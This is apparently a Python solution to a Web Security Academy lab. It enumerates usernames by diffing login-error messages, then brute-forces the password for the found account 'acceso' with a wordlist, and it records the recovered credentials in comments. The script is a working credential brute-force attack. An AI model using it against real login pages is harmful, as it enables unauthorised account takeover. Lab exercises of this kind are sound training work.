import difflib

import requests


def display_text_diff(text1, text2, data):
    diff = difflib.unified_diff(text1.splitlines(), text2.splitlines(), lineterm='')
    print('\n'.join(diff))
    print(data)

URL = "https://0aad000c0465ca57807b94a100290023.web-security-academy.net/login"

# response1 = requests.post(URL, data= {'username': 'badUser', 'password': "xxx"})


# with open("username.txt", 'r') as users_file:
#     for user in users_file:
#         user = user.strip('\n')
       
#         data = {'username': user, 'password': "xxx"}

#         response = requests.post(URL, data=data)

#         display_text_diff(response.text, response1.text, data)

# After doing this we found one different message for a query
# @@ -47,7 +46,7 @@
#                      </header>
#                      <h1>Login</h1>
#                      <section>
# -                        <p class=is-warning>Invalid username or password </p>
# +                        <p class=is-warning>Invalid username or password.</p>
#                          <form class=login-form method=POST action="/login">
#                              <label>Username</label>
#                              <input required type=username name="username" autofocus>
# {'username': 'acceso', 'password': 'xxx'}

# Détermine son password
with open("password.txt", 'r') as passwords_file:
    for password in passwords_file:
        password = password.strip('\n')
        data = {'username': "acceso", 'password': password}

        response = requests.post(URL, data=data)

        if 'Invalid username or password' not in response.text:
            print("Login réussi avec:", data)
            break

# We got Login réussi avec: {'username': 'acceso', 'password': '7777777'}